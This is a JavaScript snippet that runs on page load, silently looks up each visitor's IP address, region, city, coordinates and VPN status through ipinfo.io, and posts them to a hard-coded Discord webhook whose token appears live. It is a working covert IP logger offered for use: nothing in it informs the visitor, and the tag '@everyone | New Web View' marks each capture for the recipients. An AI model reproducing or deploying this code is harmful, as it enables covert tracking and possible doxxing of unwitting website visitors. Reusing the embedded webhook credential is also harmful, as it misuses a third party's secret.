// Replace with your Discord webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1303156766200037469/H5sIaxnnBTYm_3bfOjxxHGB7P50e82ZUdYzgrPJAxZUi4SwtHuXMeX3XWB7oMmUgcGaw';

// Function to get user's IP and other information
async function sendDataToDiscord() {
    try {
        // Fetching user's IP and location data
        const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
        const ipData = await ipResponse.json();

        // Constructing the message
        const embed = {
            title: "@everyone | New Web View",
            color: 3066993, // Color of the embed (Hexadecimal)
            fields: [
                { name: "IP", value: ipData.ip || 'N/A', inline: true },
                { name: "State", value: ipData.region || 'N/A', inline: true },
                { name: "City", value: ipData.city || 'N/A', inline: true },
                { name: "GEO", value: ipData.loc || 'N/A', inline: true },
                { name: "VPN", value: ipData.vpn ? "Yes" : "No", inline: true } // VPN detection may require a specific service
            ],
            footer: {
                text: "Data sent from a webpage visit"
            }
        };

        // Sending the embed to Discord
        await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ embeds: [embed] })
        });

        console.log("Data sent to Discord successfully!");
    } catch (error) {
        console.error("Error sending data to Discord:", error);
    }
}

// Call the function to send data when the page loads
window.onload = sendDataToDiscord;
